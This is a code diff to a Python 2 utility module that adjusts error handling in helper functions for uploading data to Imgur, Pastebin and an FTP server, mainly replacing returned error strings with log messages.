@@ -387,7 +387,7 @@ def imgur(source, api_key=None):
         post = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(data)), 'type': 'base64'}, as_json=True)
         return post['data']['link'].encode()
     else:
-        return "No Imgur API key found"
+        log("No Imgur API key found")
 
 def pastebin(source, api_key):
     """ 
@@ -402,13 +402,16 @@ def pastebin(source, api_key):
 
     """
     import urllib2
-    if api_key:
-        info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
-        paste = post('https://pastebin.com/api/api_post.php', data=info)
-        parts = urllib2.urlparse.urlsplit(paste)       
-        return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+    if isinstance(api_key, str):
+        try:
+            info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
+            paste = post('https://pastebin.com/api/api_post.php', data=info)
+            parts = urllib2.urlparse.urlsplit(paste)       
+            return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+        except Exception as e:
+            log("Upload to Pastebin failed with error: {}".format(e))
     else:
-        return "No Pastebin API key found"
+        log("No Pastebin API key found")
 
 def ftp(source, host=None, user=None, password=None, filetype=None):
     """ 
@@ -455,7 +458,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         stor = ftp.storbinary('STOR ' + path, source)
         return path
     else:
-        log(level='debug', info='missing one or more required arguments: host, user, password')
+        log('missing one or more required arguments: host, user, password')
 
 def config(*arg, **options):
     """ 
